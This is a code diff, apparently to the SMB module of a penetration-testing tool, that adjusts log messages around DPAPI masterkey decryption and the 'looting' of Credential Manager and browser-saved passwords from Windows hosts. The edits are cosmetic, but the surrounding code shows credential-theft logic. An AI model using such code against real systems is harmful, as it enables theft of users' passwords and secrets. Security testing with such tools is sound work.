@@ -1227,8 +1227,6 @@ class smb(connection):
         # conn.connect()
         conn.smb_session = self.conn
 
-        self.logger.success("Gathering masterkeys")
-
         plaintexts = {username:password for _, _, username, password, _,_ in self.db.get_credentials(credtype="plaintext")}
         nthashes = {username:nt.split(':')[1] if ':' in nt else nt for _, _, username, nt, _,_ in self.db.get_credentials(credtype="hash")}
         if self.password != '':
@@ -1248,7 +1246,7 @@ class smb(connection):
             self.logger.error("No masterkeys looted")
             return
 
-        self.logger.success("Looting secrets")
+        self.logger.success("Got {} decrypted masterkeys. Looting secrets".format(highlight(len(masterkeys))))
 
         try:
             # Collect User and Machine Credentials Manager secrets
@@ -1267,7 +1265,7 @@ class smb(connection):
             browser_triage = BrowserTriage(target=target, conn=conn, masterkeys=masterkeys)
             browser_credentials, _ = browser_triage.triage_browsers()
             for credential in browser_credentials:
-                self.logger.highlight("[%s][%s] %s - %s:%s" % (credential.winuser, credential.browser.upper(), credential.url, credential.username, credential.password))
+                self.logger.highlight("[%s][%s] %s %s:%s" % (credential.winuser, credential.browser.upper(), '- '+credential.url+' -' if credential.url!= '' else '-', credential.username, credential.password))
         except Exception as e:
             self.logger.debug("Error while looting browsers: {}".format(e))
 
